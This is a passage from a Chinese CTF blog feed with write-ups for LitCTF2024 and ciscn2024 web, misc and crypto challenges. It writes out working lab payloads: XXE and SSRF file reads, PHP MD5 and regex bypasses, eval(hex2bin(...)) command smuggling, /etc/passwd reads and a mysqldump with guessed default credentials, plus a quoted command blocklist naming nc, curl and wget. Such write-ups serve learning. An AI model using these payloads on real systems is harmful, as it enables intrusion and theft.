class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flagggg.php&quot;</span> &gt;</span>]&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>最后base64解密就行</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>剩下的题目都是考察java类的web题目，我还没学到也暂时没必要跟着复现了，总体来说题目也是较为友好的，自己还是要多复习多刷题，暂时就先到这了。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>xxe</tag>
      
      <tag>伪协议</tag>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Litctf2024</title>
    <link href="/2024/06/01/litctf2024/"/>
    <url>/2024/06/01/litctf2024/</url>
    
    <content type="html"><![CDATA[<p>前言：抽空写了一下挺适合新生的，但是复现环境一直没上，把中途写了的先放上面，如果后期上环境会写一下，要不然就咕了吧。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="涐贪恋和伱、甾―⑺de毎兮毎秒"><a href="#涐贪恋和伱、甾―⑺de毎兮毎秒" class="headerlink" title="涐贪恋和伱、甾―⑺dé毎兮毎秒"></a>涐贪恋和伱、甾―⑺dé毎兮毎秒</h2><p>下载图片，尝试改宽高，binwalk无果，steg看看，调成000就出来了</p><p><img src="/../images/litctf2024/%E6%AF%8F%E5%88%86%E6%AF%8F%E7%A7%92.png" alt="每分每秒"></p><h2 id="你说得对，但"><a href="#你说得对，但" class="headerlink" title="你说得对，但__"></a>你说得对，但__</h2><p>下载扫一下，进入云原神，foremost得到四张图拼一下得到二维码</p><p>在word里面就可以</p><p><img src="/../images/litctf2024/%E4%BD%86%E6%98%AF.png" alt="但是"></p><p>扫一下得到flag</p><h2 id="原铁，启动！"><a href="#原铁，启动！" class="headerlink" title="原铁，启动！"></a>原铁，启动！</h2><p>类似flag的特殊文字，以前写过类似的</p><p>放图片对照</p><p><img src="/../images/litctf2024/%E5%8E%9F%E7%A5%9E.jpeg" alt="原神"></p><p><img src="/../images/litctf2024/%E5%B4%A9%E9%93%81.png" alt="崩铁"></p><p>flag{good_gamer}</p><h2 id="盯帧珍珠"><a href="#盯帧珍珠" class="headerlink" title="盯帧珍珠"></a>盯帧珍珠</h2><p>010看一下是gif改一下，写个脚本出截图</p><img src="/../images/litctf2024/frame_7.png" alt="frame_7" style="zoom:25%;"><img src="/../images/litctf2024/frame_21.png" alt="frame_21" style="zoom:25%;"><img src="/../images/litctf2024/frame_31.png" alt="frame_31" style="zoom:25%;"><img src="/../images/litctf2024/frame_55.png" alt="frame_55" style="zoom:25%;"><h2 id="Everywhere-We-Go"><a href="#Everywhere-We-Go" class="headerlink" title="Everywhere We Go"></a>Everywhere We Go</h2><p>下载得到MP3</p><p>用aud看一下找到flag</p><p><img src="/../images/litctf2024/where.png" alt="where"></p><h2 id="舔到最后应有尽有"><a href="#舔到最后应有尽有" class="headerlink" title="舔到最后应有尽有"></a>舔到最后应有尽有</h2><p>密文，看着眼熟一把梭</p><p><img src="/../images/litctf2024/%E8%88%94.png" alt="舔"></p><h2 id="关键，太关键了"><a href="#关键，太关键了" class="headerlink" title="关键，太关键了!"></a>关键，太关键了!</h2><p>jetnta{e_kess_ymu_imss}</p><p>猜测前面对应的是litctf，后面估计就是i_miss_you_什么,写个代码看出现词频</p><p>得到为b，最后为boss</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="SAS-Serializing-Authentication-System"><a href="#SAS-Serializing-Authentication-System" class="headerlink" title="SAS - Serializing Authentication System"></a>SAS - Serializing Authentication System</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;secure_password&#x27;</span>);<br><br><span class="hljs-comment">// 序列化并编码对象</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br></code></pre></td></tr></table></figure><p>Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiJzZWN1cmVfcGFzc3dvcmQiO30&#x3D;</p><p>得到答案</p><h2 id="exx"><a href="#exx" class="headerlink" title="exx"></a>exx</h2><p>xxe构造，bp发包</p><p><img src="/../images/litctf2024/exx.png" alt="exx"></p><h2 id="一个…-池子？"><a href="#一个…-池子？" class="headerlink" title="一个….池子？"></a>一个….池子？</h2><p>测试为ssit,fenjing一把梭</p><p><img src="/../images/litctf2024/%E6%B1%A0%E5%AD%90.png" alt="池子"></p><h2 id="浏览器也能套娃？"><a href="#浏览器也能套娃？" class="headerlink" title="浏览器也能套娃？"></a>浏览器也能套娃？</h2><p>这题的话考察的是ssrf，这方面类型的题目之前没写过，相关的知识点也不太清楚。</p><p>先随机尝试看看</p><p><img src="/../images/litctf2024/%E5%A5%971.png" alt="套1"></p><p>正常输入网站是可以的，尝试输入其他的看看</p><p><img src="/../images/litctf2024/%E5%A5%972.png" alt="套2"></p><p>明显是ssrf，尝试绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">file:///flag<br></code></pre></td></tr></table></figure><p>或者用伪协议绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php://filter/resource=/flag<br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="高亮主题-划掉-背景查看器"><a href="#高亮主题-划掉-背景查看器" class="headerlink" title="高亮主题(划掉)背景查看器"></a>高亮主题(划掉)背景查看器</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 文件包含漏洞演示</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br><br>    <span class="hljs-comment">// 读取并包含用户输入的文件</span><br><br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br><br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access denied.&quot;</span>;<br><br>    &#125;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No file specified.&quot;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>看着像文件包含啊，匹配是否有..，试了一会没出，抓个包看看</p><p><img src="/../images/litctf2024/%E8%83%8C%E6%99%AF.png" alt="背景"></p><p>给theme输入flag,会有报错回显，那估计就是通过这个来具体在那一层需要挨个试</p><p><img src="/../images/litctf2024/%E8%83%8C%E6%99%AF1.png" alt="背景1"></p><p>得到flag</p><h2 id="百万美元的诱惑"><a href="#百万美元的诱惑" class="headerlink" title="百万美元的诱惑"></a>百万美元的诱惑</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> !== <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> &gt; <span class="hljs-number">2024</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;好康的&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;干巴爹干巴爹先辈~&quot;</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;开胃小菜))&quot;</span>);<br>&#125;<br>开胃小菜))<br></code></pre></td></tr></table></figure><p>简单的分析一下传三个值，a和b是个很常规的MD5弱比教，c是利用php的特性就可以绕过</p><p><strong>方法1</strong>：数组绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a[]=1&amp;b[]=2&amp;c=2025a<br></code></pre></td></tr></table></figure><p><strong>方法2</strong>：积累字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a=s878926199a&amp;b=s155964671a&amp;c=2025a<br></code></pre></td></tr></table></figure><p>跳到第二页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in 12.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$x</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="hljs-variable">$x</span>))&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$x</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>很常见的无字母数字绕过，只要构造12就可以了</p><p>我尝试了异或和自反失败了，应该用的是linux的特性构造自增</p><p>可以看看这篇文章，好多题这篇都可以解决</p><p><a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQT47qgxAxAIwxx&alichlgref=https://cn.bing.com/#toc-0">文章</a>，按照图片然后往后加就行</p><p><img src="/../images/litctf2024/dollar.png" alt="dollar"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br></code></pre></td></tr></table></figure><p>最后看一下源码得到flag</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h2><p>gpt一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">19041138093915757361446596917618836424321232810490087445558083446664894622882726613154205435993358657711781275735559409274819618824173042980556986038895407758062549819608054613307399838408867855623647751322414190174111523595370113664729594420259754806834656490417292174994337683676504327493103018506242963063671315605427867054873507720342850038307517016687659435974562024973531717274759193577450556292821410388268243304996720337394829726453680432751092955575512372582624694709289019402908986429709116441544332327738968785428501665254894444651547623008530708343210644814773933974042816703834571427534684321229977525229</span><br>c_list = [<span class="hljs-number">438976</span>, <span class="hljs-number">1157625</span>, <span class="hljs-number">1560896</span>, <span class="hljs-number">300763</span>, <span class="hljs-number">592704</span>, <span class="hljs-number">343000</span>, <span class="hljs-number">1860867</span>, <span class="hljs-number">1771561</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1601613</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1225043</span>, <span class="hljs-number">1331000</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1685159</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1295029</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1030301</span>, <span class="hljs-number">1442897</span>, <span class="hljs-number">1601613</span>, <span class="hljs-number">140608</span>, <span class="hljs-number">1259712</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">970299</span>, <span class="hljs-number">1601613</span>, <span class="hljs-number">941192</span>, <span class="hljs-number">132651</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1481544</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1560896</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">110592</span>, <span class="hljs-number">1061208</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1331000</span>, <span class="hljs-number">1953125</span>]<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> c_list:<br>    m, exact = gmpy2.iroot(c, <span class="hljs-number">3</span>)  <span class="hljs-comment"># 求立方根</span><br>    <span class="hljs-keyword">if</span> exact:<br>        flag += long_to_bytes(m).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密失败，密文可能过大或不是精确的立方&quot;</span>)<br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h2 id="common-primes"><a href="#common-primes" class="headerlink" title="common_primes"></a>common_primes</h2><p>gpt一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse, GCD<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># Given values</span><br>n1 = <span class="hljs-number">63306931765261881888912008095340470978772999620205174857271016152744820165330787864800482852578992473814976781143226630412780924144266471891939661312715157811674817013479316983665960087664430205713509995750877665395721635625035356901765881750073584848176491668327836527294900831898083545883834181689919776769</span><br>n2 = <span class="hljs-number">73890412251808619164803968217212494551414786402702497903464017254263780569629065810640215252722102084753519255771619560056118922616964068426636691565703046691711267156442562144139650728482437040380743352597966331370286795249123105338283013032779352474246753386108510685224781299865560425114568893879804036573</span><br>c1 = <span class="hljs-number">11273036722994861938281568979042367628277071611591846129102291159440871997302324919023708593105900105417528793646809809850626919594099479505740175853342947734943586940152981298688146019253712344529086852083823837309492466840942593843720630113494974454498664328412122979195932862028821524725158358036734514252</span><br>c2 = <span class="hljs-number">42478690444030101869094906005321968598060849172551382502632480617775125215522908666432583017311390935937075283150967678500354031213909256982757457592610576392121713817693171520657833496635639026791597219755461854281419207606460025156812307819350960182028395013278964809309982264879773316952047848608898562420</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># Compute gcd of n1 and n2 to find shared prime p</span><br>p = GCD(n1, n2)<br><br><span class="hljs-comment"># Compute the other primes q1 and q2</span><br>q1 = n1 // p<br>q2 = n2 // p<br><br><span class="hljs-comment"># Compute phi values</span><br>phi_n1 = (p - <span class="hljs-number">1</span>) * (q1 - <span class="hljs-number">1</span>)<br>phi_n2 = (p - <span class="hljs-number">1</span>) * (q2 - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Compute the private keys d1 and d2</span><br>d1 = inverse(e, phi_n1)<br>d2 = inverse(e, phi_n2)<br><br><span class="hljs-comment"># Decrypt the messages</span><br>m1 = <span class="hljs-built_in">pow</span>(c1, d1, n1)<br>m2 = <span class="hljs-built_in">pow</span>(c2, d2, n2)<br><br><span class="hljs-comment"># Convert the long integers back to bytes</span><br>message1 = long_to_bytes(m1)<br>message2 = long_to_bytes(m2)<br><br><span class="hljs-comment"># Check if the messages are equal</span><br><span class="hljs-keyword">if</span> message1 == message2:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted message:&quot;</span>, message1.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The decrypted messages are different.&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Message 1:&quot;</span>, message1.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Message 2:&quot;</span>, message2.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ssrf</tag>
      
      <tag>ssti</tag>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn2024</title>
    <link href="/2024/05/30/ciscn/2024/ciscn2024/"/>
    <url>/2024/05/30/ciscn/2024/ciscn2024/</url>
    
    <content type="html"><![CDATA[<p>前言：第一次打ciscn，但是web题目是一个不会，借此为数不多的时间想把能照着wp复现的题目写一下。题目目前在ctfshow有复现靶场。</p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是题目的源码，正则限制了很多，可以用在线网站看一下，<a href="https://www.jyshare.com/front-end/7625/#!flags=&re=ls%7Cdir%7Cnl%7Cnc%7Ccat%7Ctail%7Cmore%7Cflag%7Csh%7Ccut%7Cawk%7Cstrings%7Cod%7Ccurl%7Cping%7C%5C*%7Csort%7Cch%7Czip%7Cmod%7Csl%7Cfind%7Csed%7Ccp%7Cmv%7Cty%7Cgrep%7Cfd%7Cdf%7Csudo%7Cmore%7Ccc%7Ctac%7Cless%7Chead%7C%5C.%7C%7B%7C%7D%7Ctar%7Czip%7Cgcc%7Cuniq%7Cvi%7Cvim%7Cfile%7Cxxd%7Cbase64%7Cdate%7Cbash%7Cenv%7C%5C%3F%7Cwget%7C%5C'%7C%5C%22%7Cid%7Cwhoami%2Fi">网站</a>，这里还将到了escapeshellcmd这个函数</p><h3 id="escapeshellcmd函数"><a href="#escapeshellcmd函数" class="headerlink" title="escapeshellcmd函数"></a>escapeshellcmd函数</h3><p>转义和规范化操作有助于确保命令字符串在传递给命令行时能够正确解析，并且不会被误认为是命令或其他恶意代码。</p><p>比如这几种情况</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">替换命令字符串中的单引号 (&#x27;) 为反斜杠和单引号组合 (\&#x27;)。<br>替换命令字符串中的双引号 (&quot;) 为反斜杠和双引号组合 (\&quot;)。<br>删除命令字符串中的换行符 (\n)。<br>删除命令字符串中的回车符 (\r)。<br></code></pre></td></tr></table></figure><p>比如这种情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;127.0.0.1&#x27; -x&quot;</span>;  <span class="hljs-comment">// 这里添加了分号</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span> . <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// 输出 $a，并换行</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span> . <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// 输出 $b，并换行</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>输出为</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">127.0.0.1&#x27; -x<br>127.0.0.1^&#x27; -x<br></code></pre></td></tr></table></figure><p>就是对 ‘进行了转义，再根据题目分析一下好像并没有禁掉\和&#96;尝试可以使用php -r来执行</p><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>输入</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">cmd</span>=php -r var_dump(<span class="hljs-string">`l\s`</span>);<br></code></pre></td></tr></table></figure><p><img src="/../../../images/ciscn2024/simple.png" alt="simple"></p><p>进行查看后并没有找到，尝试查看etc&#x2F;passwd的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=<span class="hljs-built_in">paste</span> /etc/passwd//paste用于合并文件行<br></code></pre></td></tr></table></figure><p><img src="/../../../images/ciscn2024/simple1.png" alt="simple1"></p><p>猜测可能数据藏在mysql数据库中，尝试弹shell，但是在连接之后webshell没有回显这里看到一个方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=mysqldump -uroot -proot --all-databases<br></code></pre></td></tr></table></figure><p>猜测用户名和密码都是默认的,把数据都dump下来，直接爆库搜就行，用的ctfshow，然后搜一下就行</p><p><img src="/../../../images/ciscn2024/simple2.png" alt="simple2"></p><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><p>看了一下内容，由于禁用了很多，可以转hex，然后用php自带的函数，由于不能带引号只能强制截取，直接上payload吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=php -r <span class="hljs-built_in">eval</span>(hex2bin(substr(_6563686f20606c73202f603b,1)));<br></code></pre></td></tr></table></figure><p><img src="/../../../images/ciscn2024/simple3.png" alt="simple3"></p><p>之后一些列的可以通过先转，逐步爆内容，或者粗暴一点也行。</p><h3 id="解法3"><a href="#解法3" class="headerlink" title="解法3:"></a>解法3:</h3><p>其实连应该是可以连的，但是需要用python监听，我技术太捞了,把这种情况先放在这。网上其他博客或许有。</p><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>这题知识点我暂时还没有学习，把流程过一下。</p><p>先看一下系统，提示在github上找源码</p><p><img src="/../../../images/ciscn2024/cms1.png" alt="cms1"></p><p>存在ssrf的漏洞下载源码看看</p><p><img src="/../../../images/ciscn2024/cms2.png" alt="cms2"></p><p><img 